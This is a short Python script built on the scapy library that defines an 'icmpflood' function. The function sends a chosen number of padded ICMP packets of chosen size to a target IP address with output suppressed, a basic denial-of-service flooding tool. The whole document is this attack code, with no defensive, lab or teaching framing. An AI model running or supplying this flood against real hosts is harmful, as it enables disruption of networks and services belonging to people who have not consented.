from scapy.all import *

def icmpflood (targetip, number, size):
    ip = IP(dst=targetip)
    data = Raw(b"X" * size)
    p = ip / ICMP() / data
    send(p, count=number, verbose=0)
